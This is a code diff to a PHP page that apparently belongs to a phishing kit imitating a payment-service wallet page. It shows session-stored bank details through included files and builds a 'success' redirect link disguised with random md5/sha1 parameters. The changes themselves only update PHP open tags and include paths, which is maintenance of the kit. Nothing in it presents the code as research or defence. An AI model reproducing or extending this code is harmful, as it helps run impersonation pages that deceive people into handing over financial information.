@@ -173,7 +173,7 @@ echo $_SESSION['_c_type_'];
  </ul>
 
  
- <?
+ <?php
 if($_SESSION['bank'] == ''){
 	
 }else{
@@ -182,11 +182,11 @@ echo'
 <li class="fiModule-list-item vx_text-body_secondary"><a href="javascript:" data-pagename="main:walletweb:home:FIModule:walletPage" data-pagename2="main:walletweb:home:FIModule:walletPage:::" data-track-type="link" class="fiModule-fiList-links" name="FIModule_Cards">
 <span class="fiModule-cell">';
 
-include('../settings/bankimg.php');
+include("bankimg.php");
 echo'
 </span><span class="fiModule-cell enforceLtr"><span class="fiModule-fiType">
 ';
-include('../settings/bankname.php');
+include("bankname.php");
 echo'
  </span><span class="nemo_fiModule-acctDetails">
  </span></span></a></li>
@@ -256,7 +256,7 @@ echo'
 								
                             </div>
 							
-							<?
+							<?php
 							$succes = "../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."";		
 echo'
 							<a href="'.$succes.'" class="ButtonZ118"   style="
